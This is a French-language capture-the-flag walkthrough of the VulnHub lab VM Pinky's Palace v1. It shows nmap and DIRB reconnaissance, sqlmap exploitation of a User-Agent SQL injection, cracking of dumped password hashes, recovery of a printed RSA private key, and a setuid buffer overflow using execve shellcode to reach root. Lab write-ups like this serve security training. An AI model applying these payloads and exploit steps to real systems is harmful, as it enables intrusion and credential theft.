# Pinky's Palace: v1

[Pinky's Palace: v1](https://www.vulnhub.com/entry/pinkys-palace-v1,225/) est une machine virtuelle vulnérable conçue par [@Pink_P4nther](https://twitter.com/Pink_P4nther). L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. À l'heure où ces lignes sont écrites (mai 2018), il s'agit de la deuxième VM de la série Pinky's Palace qui en compte trois : [v0](https://pinkysplanet.net/pinkys-palace-easy/), [v1](https://pinkysplanet.net/pinkys-palace-intermediate/) et [v2](https://pinkysplanet.net/pinkys-palace-hard/). Cela dit, dans un article de blog publié le 20 avril 2018, il semblerait que Pinky [nous prépare la v3, soit la quatrième VM Pinky's Palace](https://pinkysplanet.net/pinkys-palacev3/). C'est parti pour ce _walkthrough_ ! Attention, spoilers...

## Synopsis

_Pinky is creating his very own website! He has began setting up services and some simple web applications._ 

## À la recherche de la Panthère rose

L'adresse IP de la VM Pinky's Palace: v1 nous est gracieusement fournie à l'écran d'ouverture de session : 192.168.56.103.

```console
[+] Pinky's Palace Intermediate
[+] Read The Flag In /root/root.txt
[+] IP Address: 192.168.56.103
pinkys-palace login: _
```

Un scan nmap va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. Il est ainsi possible de se connecter à distance avec SSH au serveur Pinky's Palace, mais sur un port non-standard : 64666 au lieu de 22 ; un serveur Web [nginx](https://fr.wikipedia.org/wiki/Nginx) 1.10.3 et un serveur proxy [Squid](https://fr.wikipedia.org/wiki/Squid_(logiciel)) sont par ailleurs installés, respectivement sur les ports 8080 et 31337.

```console
root@blinils:~/pinkyspalace-v1# nmap -sT -sV -p- 192.168.56.103
Nmap scan report for 192.168.56.103
Host is up (0.00022s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE    VERSION
8080/tcp  open  http       nginx 1.10.3
31337/tcp open  http-proxy Squid http proxy 3.5.23
64666/tcp open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
MAC Address: 08:00:27:A3:C5:2A (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Manque de chance, l'accès au site Web nous est refusé.

```console
root@blinils:~/pinkyspalace-v1# curl http://192.168.56.103:8080/
<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.10.3</center>
</body>
</html>
```

En passant par le proxy, c'est beaucoup mieux, nous obtenons une jolie page Web toute rose.

```console
root@blinils:~/pinkyspalace-v1# curl http://127.0.0.1:8080 -x http://192.168.56.103:31337
<html>
	<head>
		<title>Pinky's HTTP File Server</title>
	</head>
	<body>
		<center><h1>Pinky's HTTP File Server</h1></center>
		<center><h3>Under Development!</h3></center>
	</body>
<style>
html{
	background: #f74bff;
}
</html>
```

## Dial 'P' for Pink and 'S' for SQL Injection

À présent, y a-t-il d'autres répertoires présents sur le site ? Pour le savoir, l'outil [DIRB](https://tools.kali.org/web-applications/dirb) va se servir d'une liste pré-établie de répertoires afin de déterminer l'arborescence du site. Il s'agit là d'une [attaque par dictionnaire](https://en.wikipedia.org/wiki/Password_cracking), a contrario d'une [attaque par bruteforce](https://en.wikipedia.org/wiki/Brute-force_attack) qui consisterait à tester, de manière exhaustive, toutes les combinaisons possibles : aa, ab, ac... zy zz aaa aab... zzy zzz aaaa aaab... et ainsi de suite. DIRB dispose d'un [large panel de dictionnaires](https://github.com/digination/dirbuster-ng/tree/master/wordlists), common.txt n'a rien donné en premier lieu, le suivant est directory-list-2.3-small.txt.

```console
root@blinils:~/pinkyspalace-v1# dirb http://127.0.0.1:8080 /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -p http://192.168.56.103:31337

--snip--

GENERATED WORDS: 87568                                                         

---- Scanning URL: http://127.0.0.1:8080/ ----
==> DIRECTORY: http://127.0.0.1:8080/littlesecrets-main/                                                                                             
                                                                                                                                                    
---- Entering directory: http://127.0.0.1:8080/littlesecrets-main/ ----
                                                                                                                                                    
--snip--
```

Un répertoire caché a été trouvé par DIRB : _littlesecrets-main_. Il s'agit d'un formulaire de login intitulé _Pinky's Admin Files Login_. Généralement, dans ce genre de CTF, ces formulaires sont vulnérables aux injections SQL. Afin d'éviter de longs tests manuels fastidieux, pour trouver la bonne syntaxe permettant d'exfiltrer les données de la base, SQLMap vient à la rescousse. Il s'agit [d'un outil open source permettant d'identifier et d'exploiter une injection SQL](https://connect.ed-diamond.com/MISC/MISC-062/Utilisation-avancee-de-sqlmap) sur des applications Web. En lui spécifiant l'URL du site Web ainsi que les paramètres à tester, SQLMap va tester différentes techniques afin d'identifier la présence d'une injection SQL...

```console
root@blinils:~/pinkyspalace-v1# sqlmap -u "http://127.0.0.1:8080/littlesecrets-main/login.php" --data="user=test&pass=test" --proxy=http://192.168.56.103:31337 --level=3 --risk=3

[16:00:16] [INFO] testing connection to the target URL
[16:00:16] [INFO] testing if the target URL content is stable
[16:00:16] [INFO] target URL content is stable
[16:00:16] [INFO] testing if POST parameter 'user' is dynamic
[16:00:16] [WARNING] POST parameter 'user' does not appear to be dynamic
[16:00:16] [WARNING] heuristic (basic) test shows that POST parameter 'user' might not be injectable
[16:00:16] [INFO] testing for SQL injection on POST parameter 'user'
--snip--
[16:00:16] [WARNING] POST parameter 'user' does not seem to be injectable
[16:00:16] [INFO] testing if POST parameter 'pass' is dynamic
[16:00:16] [WARNING] POST parameter 'pass' does not appear to be dynamic
[16:00:16] [WARNING] heuristic (basic) test shows that POST parameter 'pass' might not be injectable
[16:00:16] [INFO] testing for SQL injection on POST parameter 'pass'
--snip--
[16:00:16] [WARNING] POST parameter 'pass' does not seem to be injectable
[16:00:16] [INFO] testing if Referer parameter 'Referer' is dynamic
[16:00:16] [WARNING] Referer parameter 'Referer' does not appear to be dynamic
[16:00:16] [WARNING] heuristic (basic) test shows that Referer parameter 'Referer' might not be injectable
[16:00:16] [INFO] testing for SQL injection on Referer parameter 'Referer'
--snip--
[16:00:16] [WARNING] Referer parameter 'Referer' does not seem to be injectable
[16:00:16] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
[16:00:16] [WARNING] User-Agent parameter 'User-Agent' does not appear to be dynamic
[16:00:16] [WARNING] heuristic (basic) test shows that User-Agent parameter 'User-Agent' might not be injectable
--snip--
[16:00:16] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[16:00:16] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind'
[16:00:16] [INFO] User-Agent parameter 'User-Agent' appears to be 'MySQL >= 5.0.12 OR time-based blind' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) value? [Y/n] Y
--snip--
[16:03:16] [INFO] checking if the injection point on User-Agent parameter 'User-Agent' is a false positive
User-Agent parameter 'User-Agent' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 12671 HTTP(s) requests:
---
Parameter: User-Agent (User-Agent)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: sqlmap/1.2.4#stable (http://sqlmap.org)' OR SLEEP(5) AND 'FzHk'='FzHk
---
[16:03:16] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL >= 5.0.12
[16:03:16] [INFO] fetched data logged to text files under '/root/.sqlmap/output/127.0.0.1'
```

En quelques secondes à peine, SQLMap a détecté qu'il s'agit d'une base de données MySQL et qu'en fait, les deux paramètres _user_ et _pass_ ne sont pas injectables : c'est le User-Agent qui est vulnérable aux injections SQL. Après plusieurs tentatives, SQLMap récupère les tables (--tables) ainsi que les colonnes (--columns) présentes dans chaque base de données trouvée (--dbs), et tant qu'à faire, autant récupérer tout le contenu de la base de données (--dump-all).

```console
root@blinils:~/pinkyspalace-v1# sqlmap -u "http://127.0.0.1:8080/littlesecrets-main/login.php" --data="user=test&pass=test" --proxy=http://192.168.56.103:31337 --level=3 --risk=3 --dbs

--snip--             
[16:06:03] [INFO] adjusting time delay to 1 second due to good response times
information_schema
[16:07:01] [INFO] retrieved: pinky_sec_db
available databases [2]:
[*] information_schema
[*] pinky_sec_db
```

C'est parti pour le dump des données présentes dans la base pinky_sec_db !

```console
root@blinils:~/pinkyspalace-v1# sqlmap -u "http://127.0.0.1:8080/littlesecrets-main/login.php" --data="user=test&pass=test" --proxy=http://192.168.56.103:31337 --level=3 --risk=3 --tables -D pinky_sec_db

--snip--         
[16:08:26] [INFO] adjusting time delay to 1 second due to good response times
logs
[16:08:40] [INFO] retrieved: users
Database: pinky_sec_db
[2 tables]
+-------+
| logs  |
| users |
+-------+

--snip--

root@blinils:~/pinkyspalace-v1# sqlmap -u "http://127.0.0.1:8080/littlesecrets-main/login.php" --data="user=test&pass=test" --proxy=http://192.168.56.103:31337 --level=3 --risk=3 --dump -D pinky_sec_db -T users

--snip--
[00:00:01] [INFO] fetching columns for table 'users' in database 'pinky_sec_db'
--snip--
[00:00:01] [INFO] retrieved: user
[00:00:01] [INFO] retrieved: pass
--snip--              
[00:00:01] [INFO] retrieved: pinky              
[00:00:01] [INFO] retrieved: f543dbfeaf238729831a321c7a68bee4              
[00:00:01] [INFO] retrieved: 1
[00:00:01] [INFO] retrieved: pinkymanage
[00:00:01] [INFO] retrieved: d60dffed7cc0d87e1f4a11aa06ca73af
[00:00:01] [INFO] retrieved: 2
[00:00:01] [INFO] recognized possible password hashes in column 'pass'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
--snip--                                                                                                                 
[00:00:01] [WARNING] no clear password(s) found                                                                                                     
Database: pinky_sec_db
Table: users
[2 entries]
+-----+----------------------------------+-------------+
| uid | pass                             | user        |
+-----+----------------------------------+-------------+
| 1   | f543dbfeaf238729831a321c7a68bee4 | pinky       |
| 2   | d60dffed7cc0d87e1f4a11aa06ca73af | pinkymanage |
+-----+----------------------------------+-------------+
```

[L'attaque par dictionnaire sur les hashs de mots de passe](https://repo.zenk-security.com/Reversing%20.%20cracking/Cracking_Passwords_Guide.pdf) trouvés par SQLMap n'a pas porté ses fruits. Heureusement, [CrackStation](https://crackstation.net/) arrive à la rescousse : le hash du mot de passe de pinkymanager a déjà été calculé, le mot de passe est 3pinkysaf33pinkysaf3. La découverte de ces mots de passe permet à un attaquant de se connecter en SSH sur le serveur Pinky's Palace.

## Clouseau de trè.. euh... trousseau de clés SSH

```console
root@blinils:~/pinkyspalace-v1# ssh pinkymanage@192.168.56.103 -p 64666
pinkymanage@192.168.56.103's password: 
Linux pinkys-palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Apr 19 09:33:23 2018 from 192.168.56.101
pinkymanage@pinkys-palace:~$ id
uid=1001(pinkymanage) gid=1001(pinkymanage) groups=1001(pinkymanage)
pinkymanage@pinkys-palace:~$ uname -a
Linux pinkys-palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64 GNU/Linux
```

On retrouve dans le répertoire /var/www/html les pages index.php et login.php, ainsi qu'une page logs.php qui n'avait pas été indexée par DIRB. Cette page consigne l'ensemble des tentatives de connexion au site, et stocke ainsi le login et le mot de passe testés, mais surtout... le User-Agent utilisé. Le répertoire _ultrasecretadminf1l35_ semble particulièrement alléchant pour la suite du CTF.

```console
pinkymanage@pinkys-palace:~$ cd /var/www/html/littlesecrets-main/
pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main$ ls -al
total 24
drwxr-xr-x 3 root root 4096 Feb  2 02:25 .
drwxr-xr-x 3 root root 4096 Feb  2 02:24 ..
-rw-r--r-- 1 root root  583 Feb  2 02:25 index.html
-rw-r--r-- 1 root root  934 Feb  2 01:35 login.php
-rw-r--r-- 1 root root  464 Feb  2 01:33 logs.php
drwxr-xr-x 2 root root 4096 Feb  2 02:27 ultrasecretadminf1l35


pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main$ cd ultrasecretadminf1l35/
pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ ls -al
total 16
drwxr-xr-x 2 root root 4096 Feb  2 02:27 .
drwxr-xr-x 3 root root 4096 Feb  2 02:25 ..
-rw-r--r-- 1 root root 2270 Feb  2 01:38 .ultrasecret
-rw-r--r-- 1 root root   99 Feb  2 01:17 note.txt

pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ cat note.txt
Hmm just in case I get locked out of my server I put this rsa key here.. Nobody will find it heh..

pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ cat .ultrasecret
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBMTZmeEwzLyto
L0lMVFpld2t2ZWtoSVExeWswb0xJK3kzTjRBSXRraGV6MTFJaGE4CkhjN0tPeC9MOWcyamQzSDhk
R1BVZktLcjlzZXF0Zzk3WktBOTVTL3NiNHczUXRsMUFCdS9wVktaQmJHR3NIRy8KeUl2R0VQS1Mr
QlNaNHN0TVc3SG54N2NpTXVod2Nad0xxWm1zeVN1bUVDVHVlUXN3TlBibElUbHJxb2xwWUY4eApl
NDdFbDlwSHdld05XY0lybXFyYXhDSDVUQzdVaGpnR2FRd21XM3FIeXJTcXAvaksvY3RiMVpwblB2
K0RDODMzCnUvVHlqbTZ6OFJhRFpHL2dSQklyTUduTmJnNHBaRmh0Z2JHVk9mN2ZlR3ZCRlI4QmlU
KzdWRmZPN3lFdnlCeDkKZ3hyeVN4dTJaMGFPTThRUjZNR2FETWpZVW5COWFUWXV3OEdQNHdJREFR
QUJBb0lCQUE2aUg3U0lhOTRQcDRLeApXMUx0cU9VeEQzRlZ3UGNkSFJidG5YYS80d3k0dzl6M1Mv
WjkxSzBrWURPbkEwT1VvWHZJVmwvS3JmNkYxK2lZCnJsZktvOGlNY3UreXhRRXRQa291bDllQS9r
OHJsNmNiWU5jYjNPbkRmQU9IYWxYQVU4TVpGRkF4OWdrY1NwejYKNkxPdWNOSUp1eS8zUVpOSEZo
TlIrWVJDb0RLbkZuRUlMeFlMNVd6MnFwdFdNWUR1d3RtR3pPOTY4WWJMck9WMQpva1dONmdNaUVp
NXFwckJoNWE4d0JSUVZhQnJMWVdnOFdlWGZXZmtHektveEtQRkt6aEk1ajQvRWt4TERKcXQzCkxB
N0pSeG1Gbjc3L21idmFEVzhXWlgwZk9jUzh1Z3lSQkVOMFZwZG5GNmtsNnRmT1hLR2owZ2QrZ0Fp
dzBUVlIKMkNCN1BzRUNnWUVBOElXM1pzS3RiQ2tSQnRGK1ZUQnE0SzQ2czdTaFc5QVo2K2JwYitk
MU5SVDV4UkpHK0RzegpGM2NnNE4rMzluWWc4bUZ3c0Jobi9zemdWQk5XWm91V3JSTnJERXhIMHl1
NkhPSjd6TFdRYXlVaFFKaUlQeHBjCm4vRWVkNlNyY3lTZnpnbW50T2liNGh5R2pGMC93bnRqTWM3
M3h1QVZOdU84QTZXVytoZ1ZIS0VDZ1lFQTVZaVcKSzJ2YlZOQnFFQkNQK3hyQzVkSE9CSUVXdjg5
QkZJbS9Gcy9lc2g4dUU1TG5qMTFlUCsxRVpoMkZLOTJReDlZdgp5MWJNc0FrZitwdEZVSkxjazFN
MjBlZkFhU3ZPaHI1dWFqbnlxQ29mc1NVZktaYWE3blBRb3plcHFNS1hHTW95Ck1FRWVMT3c1NnNK
aFNwMFVkWHlhejlGUUFtdnpTWFVudW8xdCtnTUNnWUVBdWJ4NDJXa0NwU0M5WGtlT3lGaGcKWUdz
TE45VUlPaTlrcFJBbk9seEIzYUQ2RkY0OTRkbE5aaFIvbGtnTTlzMVlPZlJYSWhWbTBaUUNzOHBQ
RVZkQQpIeDE4ci8yRUJhV2h6a1p6bGF5ci9xR29vUXBwUkZtbUozajZyeWZCb21RbzUrSDYyVEE3
bUl1d3Qxb1hMNmM2Ci9hNjNGcVBhbmcyVkZqZmNjL3IrNnFFQ2dZQStBenJmSEZLemhXTkNWOWN1
ZGpwMXNNdENPRVlYS0QxaStSd2gKWTZPODUrT2c4aTJSZEI1RWt5dkprdXdwdjhDZjNPUW93Wmlu
YnErdkcwZ016c0M5Sk54SXRaNHNTK09PVCtDdwozbHNLeCthc0MyVng3UGlLdDh1RWJVTnZEck9Y
eFBqdVJJbU1oWDNZU1EvVUFzQkdSWlhsMDUwVUttb2VUSUtoClNoaU9WUUtCZ1FEc1M0MWltQ3hX
Mm1lNTQxdnR3QWFJcFE1bG81T1Z6RDJBOXRlRVBzVTZGMmg2WDdwV1I2SVgKQTlycExXbWJmeEdn
SjBNVmh4Q2pwZVlnU0M4VXNkTXpOYTJBcGN3T1dRZWtORTRlTHRPN1p2MlNWRHI2Y0lyYwpIY2NF
UCtNR00yZVVmQlBua2FQa2JDUHI3dG5xUGY4ZUpxaVFVa1dWaDJDbll6ZUFIcjVPbUE9PQotLS0t
LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
```

Il semblerait que Pinky a stocké sa clé privée RSA dans un fichier caché, .ultrasecret, codée en base64. Duh!

```console
pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ base64 -d .ultrasecret
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA16fxL3/+h/ILTZewkvekhIQ1yk0oLI+y3N4AItkhez11Iha8
Hc7KOx/L9g2jd3H8dGPUfKKr9seqtg97ZKA95S/sb4w3Qtl1ABu/pVKZBbGGsHG/
yIvGEPKS+BSZ4stMW7Hnx7ciMuhwcZwLqZmsySumECTueQswNPblITlrqolpYF8x
e47El9pHwewNWcIrmqraxCH5TC7UhjgGaQwmW3qHyrSqp/jK/ctb1ZpnPv+DC833
u/Tyjm6z8RaDZG/gRBIrMGnNbg4pZFhtgbGVOf7feGvBFR8BiT+7VFfO7yEvyBx9
gxrySxu2Z0aOM8QR6MGaDMjYUnB9aTYuw8GP4wIDAQABAoIBAA6iH7SIa94Pp4Kx
W1LtqOUxD3FVwPcdHRbtnXa/4wy4w9z3S/Z91K0kYDOnA0OUoXvIVl/Krf6F1+iY
rlfKo8iMcu+yxQEtPkoul9eA/k8rl6cbYNcb3OnDfAOHalXAU8MZFFAx9gkcSpz6
6LOucNIJuy/3QZNHFhNR+YRCoDKnFnEILxYL5Wz2qptWMYDuwtmGzO968YbLrOV1
okWN6gMiEi5qprBh5a8wBRQVaBrLYWg8WeXfWfkGzKoxKPFKzhI5j4/EkxLDJqt3
LA7JRxmFn77/mbvaDW8WZX0fOcS8ugyRBEN0VpdnF6kl6tfOXKGj0gd+gAiw0TVR
2CB7PsECgYEA8IW3ZsKtbCkRBtF+VTBq4K46s7ShW9AZ6+bpb+d1NRT5xRJG+Dsz
F3cg4N+39nYg8mFwsBhn/szgVBNWZouWrRNrDExH0yu6HOJ7zLWQayUhQJiIPxpc
n/Eed6SrcySfzgmntOib4hyGjF0/wntjMc73xuAVNuO8A6WW+hgVHKECgYEA5YiW
K2vbVNBqEBCP+xrC5dHOBIEWv89BFIm/Fs/esh8uE5Lnj11eP+1EZh2FK92Qx9Yv
y1bMsAkf+ptFUJLck1M20efAaSvOhr5uajnyqCofsSUfKZaa7nPQozepqMKXGMoy
MEEeLOw56sJhSp0UdXyaz9FQAmvzSXUnuo1t+gMCgYEAubx42WkCpSC9XkeOyFhg
YGsLN9UIOi9kpRAnOlxB3aD6FF494dlNZhR/lkgM9s1YOfRXIhVm0ZQCs8pPEVdA
Hx18r/2EBaWhzkZzlayr/qGooQppRFmmJ3j6ryfBomQo5+H62TA7mIuwt1oXL6c6
/a63FqPang2VFjfcc/r+6qECgYA+AzrfHFKzhWNCV9cudjp1sMtCOEYXKD1i+Rwh
Y6O85+Og8i2RdB5EkyvJkuwpv8Cf3OQowZinbq+vG0gMzsC9JNxItZ4sS+OOT+Cw
3lsKx+asC2Vx7PiKt8uEbUNvDrOXxPjuRImMhX3YSQ/UAsBGRZXl050UKmoeTIKh
ShiOVQKBgQDsS41imCxW2me541vtwAaIpQ5lo5OVzD2A9teEPsU6F2h6X7pWR6IX
A9rpLWmbfxGgJ0MVhxCjpeYgSC8UsdMzNa2ApcwOWQekNE4eLtO7Zv2SVDr6cIrc
HccEP+MGM2eUfBPnkaPkbCPr7tnqPf8eJqiQUkWVh2CnYzeAHr5OmA==
-----END RSA PRIVATE KEY-----
```

On récupère la clé privée RSA et hop, on s'en sert pour se connecter au serveur en tant que pinky, et sans mot de passe évidemment !

```console
pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ base64 -d .ultrasecret > ~/Palace.Pin.key
pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ cd ~
pinkymanage@pinkys-palace:~$ chmod 600 Palace.Pin.key

pinkymanage@pinkys-palace:~$ id
uid=1001(pinkymanage) gid=1001(pinkymanage) groups=1001(pinkymanage)

pinkymanage@pinkys-palace:~$ ssh pinky@localhost -p 64666 -i Palace.Pin.key
Linux pinkys-palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun May  6 15:48:38 2018 from ::1

pinky@pinkys-palace:~$ id
uid=1000(pinky) gid=1000(pinky) groups=1000(pinky),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

## Twinkle, Twinkle, Little Pink

_Nota bene : section à rédiger_

Lecture recommandée et qui m'a été utile pour finir ce CTF :

[Buffer Overflow](https://beta.hackndo.com/buffer-overflow/) par [Pixis](https://twitter.com/intent/user?screen_name=hackanddo) | [Buffer overflow et variable d'environnement](http://www.hacktion.be/fr/10-buffer-overflow-variable-environnement) par [Que20](https://twitter.com/que_20) | 
[Buffer Overflow & gdb](https://www.0x0ff.info/2015/buffer-overflow-gdb-part-2/) par [0x0ff](https://www.0x0ff.info/author/0x0ff/)

```console
pinky@pinkys-palace:~$ ls
adminhelper  note.txt

pinky@pinkys-palace:~$ cat note.txt
Been working on this program to help me when I need to do administrator tasks sudo is just too hard to configure and I can never remember my root password! Sadly I'm fairly new to C so I was working on my printing skills because Im not sure how to implement shell spawning yet :(

pinky@pinkys-palace:~$ file adminhelper
adminhelper: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3f035a0120e92e5c0e569dc8f3f4e813ef41409b, not stripped

--snip--

pinky@pinkys-palace:~$ ./adminhelper \`python -c 'print "A"*71'\`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

pinky@pinkys-palace:~$ ./adminhelper \`python -c 'print "A"*72'\`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Bus error

pinky@pinkys-palace:~$ ./adminhelper \`python -c 'print "A"*73'\`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault

--snip--

pinky@pinkys-palace:~$ gdb --args ./adminhelper \`python -c 'print "A"*72+"B"*6'\`
GNU gdb (Debian 7.12-6) 7.12.0.20161007-git

--snip--

Reading symbols from ./adminhelper...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x817
(gdb) r
Starting program: /home/pinky/adminhelper AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB

Breakpoint 1, 0x0000555555554817 in main ()
(gdb) continue
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x0000424242424242 in ?? ()
```

Bingo !

```console
pinky@pinkys-palace:~$ export SHELLCODE=$(python -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"')

pinky@pinkys-palace:~$ ./getenv SHELLCODE ./adminhelper
SHELLCODE will be at 0x7fffffffee8d

pinky@pinkys-palace:~$ ./adminhelper \`python -c 'print "A"*72+"\x8d\xee\xff\xff\xff\x7f"'\`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����

# id
uid=1000(pinky) gid=1000(pinky) euid=0(root) groups=1000(pinky),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

# ls /root        
root.txt

# cat /root/root.txt
===========[!!!CONGRATS!!!]===========

[+] You r00ted Pinky's Palace Intermediate!
[+] I hope you enjoyed this box!
[+] Cheers to VulnHub!
[+] Twitter: @Pink_P4nther

Flag: --REDACTED--

--snip--

# python -c 'import os; os.setuid(0); os.setgid(0); os.seteuid(0); os.system("/bin/bash")'
root@pinkys-palace:/home/pinky# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(pinky)
```
